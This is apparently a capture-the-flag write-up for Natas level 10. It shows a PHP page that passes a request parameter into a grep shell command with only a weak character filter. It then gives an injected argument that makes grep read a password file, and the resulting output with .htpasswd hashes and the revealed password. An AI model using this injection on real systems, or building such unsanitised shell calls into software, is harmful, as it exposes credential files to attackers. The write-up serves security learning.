```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

Since it blocks us from using `;`, we can see that the key input is before dictionary.txt and from previous challenges, we know the flag will be in `/etc/natas_webpass/natasXX` so with grep we can check multiple files like `grep -i term file1 file2 file3`, so our key can just be the file we want to check.. term will be what we search for, so with some regex for any line `.*` we can use:

`.* /etc/natas_webpass/natas11`

```
.htaccess:AuthType Basic
.htaccess: AuthName "Authentication required"
.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
.htaccess: require valid-user
.htpasswd:natas10:$1$XOXwo/z0$K/6kBzbw4cQ5exEWpW5OV0
.htpasswd:natas10:$1$mRklUuvs$D4FovAtQ6y2mb5vXLAy.P/
.htpasswd:natas10:$1$SpbdWYWN$qM554rKY7WrlXF5P6ErYN/
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
dictionary.txt:African
dictionary.txt:Africans
```

There's our next password!

`U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`